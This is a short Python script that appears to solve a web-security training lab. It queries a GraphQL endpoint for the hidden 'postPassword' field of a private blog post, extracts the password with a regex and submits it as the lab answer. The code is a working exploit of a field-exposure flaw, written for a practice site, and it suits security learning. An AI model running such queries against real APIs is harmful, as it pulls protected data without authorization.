###########################################
#
# Lab: Accessing private GraphQL posts
#
# Hack Steps:
#      1. Query the hidden post
#      2. Extract the password
#      3. Submitt the solution
#
###########################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a7b004404aa5a7e83d243e200630063.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Querying the hidden post.. ", end="", flush=True)

    query = """query getBlogSummaries {
                            getBlogPost(id: 3) {
                                postPassword
                            }
                        }"""
    json = {  "query": query , "operationName": "getBlogSummaries"}
    query_result = post_data("/graphql/v1", json=json)        

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the password.. ", end="", flush=True)

    password = re.findall("\"postPassword\": \"(\w*)\"", query_result.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + password)
    print(Fore.WHITE + "⦗3⦘ Submitting the solution.. ", end="", flush=True)        

    data = { "answer": password }
    post_data("/submitSolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(path, data = None, json = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, json=json, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

